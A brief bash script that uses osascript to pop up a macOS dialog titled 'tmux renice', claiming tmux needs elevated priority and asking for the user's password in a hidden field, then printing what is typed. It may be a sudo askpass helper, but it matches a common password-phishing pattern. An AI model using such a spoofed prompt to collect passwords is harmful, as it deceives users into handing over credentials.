#!/bin/bash
osascript -e 'display dialog "tmux needs elevated priority.\nEnter password:" default answer "" with hidden answer with title "tmux renice"' -e 'text returned of result' 2>/dev/null
